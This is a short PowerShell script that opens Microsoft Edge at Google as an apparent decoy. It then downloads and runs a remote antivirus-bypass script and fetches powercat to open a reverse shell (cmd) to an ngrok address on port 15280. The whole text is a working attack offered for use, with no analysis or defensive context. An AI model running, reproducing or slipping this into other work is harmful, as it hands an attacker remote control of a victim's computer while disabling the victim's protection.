start microsoft-edge:http://google.com
$wshell = New-Object -ComObject wscript.shell;
$wshell.AppActivate('Google - Microsoft Edge')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); 
Invoke-AlokS-AvBypass;
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 15280 -e cmd